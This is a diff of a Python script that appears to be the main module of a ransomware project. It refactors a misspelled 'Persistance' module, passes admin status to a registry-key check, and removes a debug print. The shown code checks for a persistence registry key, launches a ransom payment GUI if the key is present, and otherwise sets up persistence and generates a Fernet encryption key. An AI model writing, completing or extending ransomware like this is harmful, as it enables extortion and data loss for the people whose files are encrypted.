@@ -4,25 +4,26 @@ import os, \
     Crypto_files, \
     Client, \
     Gui, \
-    Persistance, \
+    Persistence, \
     List_external_HDD
 from cryptography.fernet import Fernet
 from ctypes import windll
 
 # Variables
 chemin = os.path.expanduser("~") + "\\Music\\test_ransonware\\"
-registry_key_exists = Persistance.check_if_key_exists()
 # Check, if the programm is executed with admin rights
 is_admin = windll.shell32.IsUserAnAdmin()
+
+registry_key_exists = Persistence.check_if_key_exists(is_admin)
+
 
 
 if registry_key_exists:
     # Launching the GUI
     Gui.payment_function(chemin)
 else:
-    print("else")
     # Create the persistence
-    Persistance.create_persistence(is_admin)
+    Persistence.create_persistence(is_admin)
 
     # Generate the key
     key = Fernet.generate_key()
